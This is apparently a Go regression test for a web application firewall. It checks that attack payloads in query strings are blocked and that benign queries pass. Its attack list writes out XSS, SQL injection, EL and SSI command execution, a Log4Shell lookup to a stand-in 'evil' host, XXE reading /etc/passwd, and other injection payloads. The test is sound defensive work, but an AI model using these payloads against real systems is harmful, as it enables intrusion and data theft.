package engine

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"wewaf/internal/core"
)

// qsBlocked runs "/p?q=<payload>" (URL-encoded) through both request phases.
func qsBlocked(eng *Engine, payload string) bool {
	req := httptest.NewRequest(http.MethodGet, "http://x/p?q="+url.QueryEscape(payload), nil)
	tx := core.NewTransaction(nil, req, nil)
	tx.SetMetadata("body", []byte(""))
	return eng.ProcessRequestHeaders(tx) != nil || eng.ProcessRequestBody(tx) != nil
}

// formBlocked runs the same payload as an x-www-form-urlencoded body.
func formBlocked(eng *Engine, payload string) bool {
	b := "q=" + url.QueryEscape(payload)
	req := httptest.NewRequest(http.MethodPost, "/p", strings.NewReader(b))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	tx := core.NewTransaction(nil, req, nil)
	tx.SetMetadata("body", []byte(b))
	return eng.ProcessRequestHeaders(tx) != nil || eng.ProcessRequestBody(tx) != nil
}

// TestQueryStringSignatureParity is the round-14 regression for the systemic
// gap: the bulk of the signature set runs in the body phase, so query-string
// args (built in the header phase) were never inspected by it. Reflected
// ?q=<script> — the most common XSS vector — and many other body-only classes
// bypassed every rule. ProcessRequestBody now mirrors the query args + URI
// into the body-phase target map, so any payload caught as a form body is also
// caught in the query string.
func TestQueryStringSignatureParity(t *testing.T) {
	eng := newFuzzEngine(t)
	attacks := []string{
		"<script>alert(1)</script>",                              // reflected XSS (was the big miss)
		"<img src=x onerror=alert(1)>",                           // XSS
		"<svg onload=alert(1)>",                                  // XSS
		"' or '1'='1",                                            // SQLi tautology
		"1 UNION SELECT password FROM users",                     // SQLi union
		"${T(java.lang.Runtime).getRuntime().exec('id')}",        // EL injection
		"' or '1'='1",                                            // XPath/SQLi
		"/child::node()",                                         // XPath axis
		`<!--#exec cmd="id"-->`,                                  // SSI
		"${jndi:ldap://evil/a}",                                  // Log4Shell
		"__proto__[isAdmin]=true",                                // prototype pollution
		`O:8:"x":1:{s:1:"a";s:1:"b";}`,                           // PHP deserialization
		"class.module.classLoader.resources",                     // Spring4Shell
		"*)(uid=*))(|(uid=*",                                     // LDAP injection
		`<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>`, // XXE
	}
	for _, p := range attacks {
		p := p
		t.Run(p, func(t *testing.T) {
			if !qsBlocked(eng, p) {
				t.Errorf("query-string payload not blocked (form-blocked=%v): %q", formBlocked(eng, p), p)
			}
		})
	}
}

// TestQueryStringBenignCorpus guards the systemic change: with the full rule
// set now inspecting query strings, a broad corpus of realistic benign queries
// (search text, pagination, IDs, URLs, JSON, prices, code-ish strings, i18n
// placeholders) must stay clean. A regression here would block normal traffic.
func TestQueryStringBenignCorpus(t *testing.T) {
	eng := newFuzzEngine(t)
	q := url.QueryEscape
	cases := []string{
		"page=2&sort=name&order=desc&limit=20",
		"q=" + q("how to cook pasta"),
		"search=" + q("C++ programming tutorial"),
		"q=" + q("user@example.com"),
		"email=" + q("john.doe@example.com"),
		"from=2024-01-01&to=2024-12-31",
		"id=550e8400-e29b-41d4-a716-446655440000",
		"lat=40.7128&lng=-74.0060",
		"min=10&max=100&currency=USD",
		"file=" + q("quarterly-report-2024.pdf"),
		"filter[status]=active&filter[type]=premium",
		"ids[]=1&ids[]=2&ids[]=3",
		"q=" + q("Tom & Jerry cartoons"),
		"title=" + q("C# vs Java: a comparison"),
		"q=" + q("50% off everything!"),
		"note=" + q("use <= and >= for ranges"),
		"color=" + q("#ff0000"),
		"name=" + q("O'Brien & Sons, Inc."),
		"q=" + q(`"exact phrase search"`),
		"path=" + q("/home/user/documents/notes.txt"),
		"v=1.2.3&build=20240618",
		"data=" + q("SGVsbG8gV29ybGQh"),
		"redirect=" + q("/dashboard/reports"),
		"next=" + q("https://example.com/welcome"),
		"price=" + q("the total is ${amount} dollars"),
		"tpl=" + q("Hello {{name}}, welcome back"),
		"msg=" + q("meeting at 3pm @ the office"),
		"expr=" + q("result = a + b"),
		"q=" + q("naïve café résumé"),
		"desc=" + q("a list: apples, oranges; and bananas"),
		"comment=" + q("I rate this 5/5 -- great product!"),
		"json=" + q(`{"theme":{"primary":"#f97316","secondary":"#fb923c"}}`),
		"phone=" + q("+1 (555) 123-4567"),
		"addr=" + q("123 Main St, Apt 4B"),
		"hashtag=" + q("#throwback"),
		"calc=" + q("(1 + 2) * 3"),
		"step=" + q("step 1 -- then step 2"),
		"item=" + q("item #5 in the list"),
		"css=" + q("--main-color: blue"),
	}
	for _, c := range cases {
		c := c
		t.Run(c, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "http://x/p?"+c, nil)
			tx := core.NewTransaction(nil, req, nil)
			tx.SetMetadata("body", []byte(""))
			if eng.ProcessRequestHeaders(tx) != nil || eng.ProcessRequestBody(tx) != nil {
				t.Errorf("benign query wrongly blocked: %q", c)
			}
		})
	}
}
